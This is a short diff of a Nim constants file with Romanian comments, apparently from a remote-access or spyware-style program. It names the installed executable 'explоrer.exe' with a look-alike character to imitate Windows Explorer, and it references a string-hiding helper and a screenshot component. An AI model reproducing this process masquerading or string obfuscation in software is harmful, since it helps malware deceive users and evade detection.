@@ -1,5 +1,5 @@
 ## aici o pun constantele de care am nev si in alte fisiere,
-from functions/hideString import e
+import functions/hideString
 
 ## dezactiveaza functiile de care nu am nev cand developez
 const isProd* {.booldefine.}: bool = false
@@ -8,7 +8,7 @@ const isProd* {.booldefine.}: bool = false
 const BUFFER_LENGTH* = 2048
 
 ## numele la program cand ii instalat
-const EXE_NAME* = e"explоrer.exe"
+const EXE_NAME* = "explоrer.exe"
 
 ## folosit in master si in components/screenshot.nim
 when isProd:
